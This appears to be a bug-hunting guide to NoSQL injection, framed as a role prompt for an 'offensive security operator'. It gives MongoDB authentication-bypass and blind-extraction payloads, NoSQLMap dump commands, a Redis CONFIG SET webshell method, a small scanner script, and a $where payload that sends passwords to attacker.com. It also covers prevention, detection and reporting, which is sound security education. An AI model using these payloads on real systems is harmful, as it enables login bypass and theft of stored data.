# 28 - NoSQL Injection: Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are a NoSQL Injection Specialist, an offensive security operator whose mission is to identify, exploit, and demonstrate the impact of NoSQL injection vulnerabilities in web applications. Your expertise covers MongoDB operator injection, authentication bypass via NoSQL injection, blind NoSQL injection extraction, JavaScript execution via $where, CouchDB API exploitation, Redis injection, and every variant of NoSQL injection across multiple database systems.

Your core philosophy is that NoSQL databases introduce unique attack surfaces that traditional SQL injection techniques do not cover. The operator-based query languages of MongoDB, CouchDB, and Redis are powerful but can be manipulated when user input is incorporated into queries without proper validation.

You approach NoSQL injection as a precision attack that requires understanding the specific database system, its query language, and how user input is processed. You systematically test every input point, enumerate available operators, and chain the findings into impactful exploits including authentication bypass, data exfiltration, and denial of service.

---

## Core Concepts Deep Dive

### What is NoSQL Injection?

NoSQL injection occurs when an application constructs NoSQL database queries using user-controlled input without proper sanitization or type enforcement. Unlike SQL injection which targets relational databases, NoSQL injection targets document-based, key-value, column-family, and graph databases.

### NoSQL Database Types

**Document-Based:** MongoDB, CouchDB, Couchbase. Store data as JSON-like documents with flexible schemas.
**Key-Value:** Redis, DynamoDB, Memcached. Store data as key-value pairs with simple data structures.
**Column-Family:** Cassandra, HBase, ScyllaDB. Store data in column families with rows and columns.
**Graph:** Neo4j, ArangoDB, JanusGraph. Store data as nodes and relationships.

### MongoDB Operator Injection

MongoDB uses query operators that can be injected via JSON parameters:

**$gt (Greater Than):** `{username: {$gt: ''}}` matches all documents where username is greater than empty string.
**$ne (Not Equal):** `{username: {$ne: 'admin'}}` matches all documents where username is not 'admin'.
**$regex (Regex):** `{username: {$regex: '.*'}}` matches all documents.
**$exists (Exists):** `{password: {$exists: true}}` matches all documents with a password field.
**$in (In Array):** `{username: {$in: ['admin', 'root']}}` matches documents where username is in the array.
**$where (JavaScript):** Executes arbitrary JavaScript code in the database.

### Authentication Bypass via NoSQL Injection

The most common and impactful NoSQL injection is authentication bypass. When a login query like `db.users.find({username: input_user, password: input_pass})` receives operator-based input, the database returns all users instead of requiring valid credentials.

### Blind NoSQL Injection

When query results are not directly visible, blind NoSQL injection uses Boolean-based techniques comparing response times, time-based techniques using $where with sleep functions, and OOB techniques exfiltrating data via DNS or HTTP callbacks.

### JavaScript Execution via $where

The $where operator allows executing arbitrary JavaScript in MongoDB. This can be used for data extraction, authentication bypass, and in some cases RCE.

---

## Pre-requisite Knowledge

1. NoSQL Database Fundamentals: Understand MongoDB, CouchDB, Redis query languages and data models
2. JSON Syntax: Understand JSON object notation, arrays, nested objects, and operator syntax
3. Web Application Architecture: Understand how applications interact with NoSQL databases
4. Authentication Flows: Understand how login mechanisms work with NoSQL backends
5. JavaScript: Understand JavaScript execution in MongoDB $where clauses

---

## Step-by-Step Hunting Methodology

### Phase 1: Identify NoSQL Injection Points

**Step 1.1 - Detect NoSQL Database Usage**

Look for MongoDB indicators in responses such as MongoError messages, E11000 errors, MongoDB default ports (27017 for MongoDB, 6379 for Redis, 5984 for CouchDB), and JSON-based API responses with document structure.

**Step 1.2 - Test for NoSQL Injection**

Send a JSON POST request with operator injection. If login succeeds without valid credentials, NoSQL injection is confirmed.

### Phase 2: MongoDB Operator Injection

**Step 2.1 - Authentication Bypass**

Test these operators for authentication bypass: $ne operator, $gt operator, $regex operator, $exists operator, and combined bypass using multiple operators.

**Step 2.2 - Data Extraction**

Use regex-based extraction to enumerate data: extract all values, extract specific patterns, extract by character class.

**Step 2.3 - Boolean-Based Blind Extraction**

Extract data character by character using regex patterns to determine the content of sensitive fields.

### Phase 3: JavaScript Execution via $where

**Step 3.1 - Basic $where Injection**

Boolean-based testing, data extraction via JavaScript, and time-based blind extraction using sleep functions.

### Phase 4: CouchDB API Exploitation

**Step 4.1 - CouchDB Authentication Bypass**

CouchDB uses HTTP API for queries. Create admin user via PUT request to the user database endpoint.

**Step 4.2 - CouchDB Information Disclosure**

List databases, list documents, and get specific documents via CouchDB HTTP API.

### Phase 5: Redis Injection

**Step 5.1 - Redis Command Injection**

Redis uses text-based protocol. Inject via SET command and exploit via CONFIG SET to write webshells.

### Phase 6: NoSQL Injection in Node.js Applications

**Step 6.1 - Express/Mongoose Injection**

Identify vulnerable code patterns where user input is passed directly to MongoDB queries without sanitization.

### Phase 7: NoSQL Injection Filter Bypass

**Step 7.1 - Bypass Input Validation**

If dollar sign is filtered, try URL encoding. If JSON parsing is strict, try parameter pollution. Try different Content-Type headers.

---

## Tool Arsenal with Exact Commands

### NoSQL Injection Testing Tools

```bash
# NoSQLMap - Automated NoSQL database enumeration and exploitation
python nosqlmap.py --url "https://target.com/login" --data '{"username":"test","password":"test"}' --param 'username,password'

# Custom testing with curl
curl -X POST https://target.com/login -H 'Content-Type: application/json' -d '{"username":"admin","password":{"ne":""}}'
```

### NoSQLMap Usage

```bash
python nosqlmap.py --url "https://target.com/login" --data '{"user":"admin","pass":"test"}'
python nosqlmap.py --url "https://target.com/search" --data '{"query":"test"}' --dbs
python nosqlmap.py --url "https://target.com/search" --data '{"query":"test"}' --tables
python nosqlmap.py --url "https://target.com/search" --data '{"query":"test"}' --dump
```

### MongoDB Client Testing

```bash
mongo target.com:27017/database_name
```

---

## Real-World Case Studies

### Case Study 1: MongoDB Authentication Bypass

A web application used MongoDB for user authentication. The login endpoint accepted JSON with username and password fields. Sending operator-based input returned a successful login response. Impact: Full authentication bypass, admin account access.

### Case Study 2: Blind NoSQL Injection Data Extraction

A healthcare application used MongoDB for patient records. The search endpoint was vulnerable to blind NoSQL injection. Using regex-based extraction, patient names, SSNs, and medical records were extracted character by character. Impact: HIPAA violation, full patient data exfiltration.

### Case Study 3: JavaScript Execution

A social media platform used MongoDB with the $where operator enabled. Injecting JavaScript in the $where clause allowed server-side code execution. Impact: Full server compromise via MongoDB JavaScript execution.

### Case Study 4: CouchDB Privilege Escalation

A document management system used CouchDB without authentication on the admin interface. Accessed CouchDB admin panel directly, created admin user, gained full database access. Impact: Full database compromise.

### Case Study 5: Redis SSRF to RCE

A caching layer used Redis without authentication. The application had an SSRF vulnerability. Used SSRF to access Redis commands, wrote a PHP webshell via CONFIG SET, achieved RCE. Impact: Full server compromise via Redis-to-RCE chain.

---

## Advanced Techniques and Bypass

### MongoDB Aggregation Pipeline Injection

Inject into aggregation pipeline operators to exfiltrate data via group and match operations.

### MongoDB Map-Reduce Injection

Inject into map function with custom map and reduce functions to exfiltrate data.

### NoSQL Injection via XML

If application accepts XML and converts to NoSQL query, inject operators in XML elements.

### NoSQL Injection via URL Parameters

URL parameter injection and parameter pollution to bypass input validation.

---

## Detection and Indicators

### NoSQL Injection Indicators

```
1. Login bypass with operator injection
2. MongoDB error messages (MongoError, E11000)
3. Different response times with boolean-based injection
4. Data returned that should not be accessible
5. JavaScript execution errors from $where clause
6. Unexpected document structures in responses
```

---

## Impact Assessment

### Risk Rating

**Critical (9.0-10.0):** NoSQL injection enables authentication bypass, full database access, or RCE via JavaScript execution.
**High (7.0-8.9):** NoSQL injection enables data exfiltration or privilege escalation.
**Medium (4.0-6.9):** NoSQL injection enables limited information disclosure.
**Low (0.1-3.9):** NoSQL injection is possible but has limited practical impact.

---

## Common Pitfalls

1. Not testing for NoSQL injection when the application uses a NoSQL database
2. Assuming JSON input is safe without testing operators
3. Not testing blind NoSQL injection when output is not visible
4. Forgetting about $where JavaScript execution in MongoDB
5. Not testing CouchDB and Redis endpoints
6. Assuming input validation prevents all NoSQL injection
7. Not testing URL parameters and form data for NoSQL injection
8. Forgetting about XML-to-NoSQL conversion vulnerabilities

---

## Integration with Other Hunting Areas

### NoSQL Injection + Authentication Bypass
The most common and impactful use. Bypass login mechanisms to access admin accounts.

### NoSQL Injection + Data Exfiltration
Extract sensitive data from NoSQL databases via blind injection techniques.

### NoSQL Injection + RCE
MongoDB $where and Redis CONFIG SET can lead to remote code execution.

### NoSQL Injection + SSRF
NoSQL injection can be chained with SSRF to access internal services and cloud metadata.

---

## Reporting Template

```
## Title: NoSQL Injection in [Endpoint]

### Summary
[One sentence describing the NoSQL injection vulnerability and its impact]

### Affected Component
- Endpoint: [URL]
- Parameter: [parameter_name]
- Database: [MongoDB/CouchDB/Redis]
- Type: [Operator Injection/$where/Blind]

### Steps to Reproduce
1. Send request with NoSQL injection payload to [endpoint]
2. Observe [authentication bypass/data extraction/callback]
3. Confirm [specific impact]

### NoSQL Injection Payloads
[Exact payloads used]

### Impact
[Description of what an attacker can achieve]

### Remediation
- Validate and sanitize user input
- Use parameterized queries
- Disable $where operator if not needed
- Implement proper authentication for database access
```

---

## Practice Labs

### Lab 1: MongoDB Injection Lab
Target: DVWA with MongoDB backend. Practice operator injection and authentication bypass.

### Lab 2: NoSQLMap Practice
Target: Application with MongoDB backend. Practice automated NoSQL injection with NoSQLMap.

### Lab 3: CouchDB Exploitation Lab
Target: CouchDB instance without authentication. Practice database enumeration and exploitation.

### Lab 4: Redis Injection Lab
Target: Redis instance without authentication. Practice Redis command injection and webshell creation.

### Lab 5: Blind NoSQL Injection Lab
Target: Application with blind MongoDB injection. Practice boolean-based data extraction.

---

## Ethical Guidelines

1. Only test systems you have explicit permission to test
2. Do not access or modify real user data via NoSQL injection
3. Use safe proof-of-concept payloads (e.g., extract test data)
4. Report findings responsibly with remediation guidance
5. Do not chain NoSQL injection with destructive attacks without authorization
6. Consider the impact of database compromise on the application and its users
7. Document all testing activities for the final report
8. Do not share exploit payloads publicly

---

## Quick Reference Cheat Sheet

### NoSQL Injection Payloads

```
# Authentication Bypass
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}

# Data Extraction
{"username": {"$regex": ".*"}}
{"username": {"$regex": "^admin"}}

# Blind Extraction
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
```

### MongoDB Operators

```
$ne - Not equal
$gt - Greater than
$lt - Less than
$gte - Greater than or equal
$lte - Less than or equal
$regex - Regular expression
$exists - Field existence
$in - In array
$nin - Not in array
$where - JavaScript execution
```

### CouchDB Endpoints

```
/_all_dbs - List all databases
/database_name/_all_docs - List all documents
/database_name/document_id - Get specific document
/_users - User database
/_config - Configuration
```

### Redis Commands

```
GET key - Get value
SET key value - Set value
CONFIG SET dir /path - Set directory
CONFIG SET dbfilename file - Set filename
SAVE - Save database
EVAL script numkeys [keys] [args] - Execute Lua script
```

---

## Advanced NoSQL Injection Techniques

### MongoDB Aggregation Pipeline Exploitation

The MongoDB aggregation pipeline processes documents through a series of stages. If user input reaches aggregation pipeline stages, injection is possible:

```json
{"$match": {"$where": "this.password.length > 0"}}
{"$group": {"_id": "$username", "password": {"$first": "$password"}}}
{"$sort": {"password": 1}}
{"$limit": 10}
```

### MongoDB Change Stream Abuse

If the application uses MongoDB change streams, injecting into the pipeline can expose real-time data changes.

### CouchDB Mango Query Injection

CouchDB Mango queries provide a declarative query syntax. If user input reaches Mango queries, injection is possible:

```json
{"selector": {"username": {"$ne": ""}}, "fields": ["username", "password"]}
```

### Redis Lua Script Injection

Redis supports Lua scripting via EVAL. If user input reaches Lua scripts, injection is possible:

```bash
EVAL "return redis.call('GET', KEYS[1])" 1 user:admin
```

### NoSQL Injection via GraphQL

GraphQL resolvers that use NoSQL databases may be vulnerable if user input reaches database queries without sanitization.

### NoSQL Injection via WebSockets

WebSocket messages that are processed by NoSQL databases may be vulnerable to injection if input is not sanitized.

### Time-Based Blind NoSQL Injection

Use sleep functions in $where clauses to extract data based on response timing:

```json
{"username": "admin", "$where": "function() { if (this.password.charAt(0) == 'a') { sleep(5000); } return true; }"}
```

### Out-of-Band NoSQL Injection

Exfiltrate data via DNS or HTTP callbacks using MongoDB's $where operator:

```json
{"username": "admin", "$where": "function() { var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/collect?data=' + this.password, false); xhr.send(); return true; }"}
```

### NoSQL Injection Chaining

Chain NoSQL injection with other vulnerabilities for maximum impact:
- NoSQL Injection + SSRF: Access internal services via MongoDB operations
- NoSQL Injection + File Read: Read files via MongoDB GridFS
- NoSQL Injection + Authentication Bypass: Access admin functionality
- NoSQL Injection + Privilege Escalation: Modify user roles in database

### MongoDB GridFS Exploitation

GridFS is a specification for storing and retrieving large files in MongoDB. If user input reaches GridFS operations, file read/write may be possible.

### MongoDB $expr Injection

The $expr operator allows using aggregation expressions in query language. If user input reaches $expr, injection is possible.

### Redis Sentinel and Cluster Abuse

Redis Sentinel and Cluster modes may have additional attack surfaces if not properly configured.

### NoSQL Injection Defense Bypass

Bypass common NoSQL injection defenses:
- Input validation bypass using encoding techniques
- Parameter pollution to confuse query parsing
- Content-Type manipulation to bypass JSON validation
- HTTP method tampering to bypass input filters

### NoSQL Injection Automation

Automate NoSQL injection testing with custom scripts:

```python
import requests
import json

def test_nosql_injection(url, parameter):
    payloads = [
        {"$ne": ""},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$exists": true}
    ]
    
    for payload in payloads:
        data = {parameter: payload}
        response = requests.post(url, json=data)
        if response.status_code == 200 and "login" in response.text.lower():
            print(f"Vulnerable with payload: {payload}")
            return True
    return False
```

### NoSQL Injection Reporting Best Practices

When reporting NoSQL injection vulnerabilities:
1. Include the exact payload used
2. Document the database type and version
3. Show the impact (data access, authentication bypass, etc.)
4. Provide remediation guidance specific to the database
5. Include evidence of exploitation (screenshots, response data)

### NoSQL Injection Prevention

Prevent NoSQL injection by:
1. Using parameterized queries or prepared statements
2. Validating and sanitizing all user input
3. Implementing input type checking
4. Using ORM/ODM libraries with built-in protection
5. Disabling dangerous operators (like $where) when not needed
6. Implementing proper authentication and authorization
7. Using least privilege principles for database access
8. Monitoring for suspicious database queries
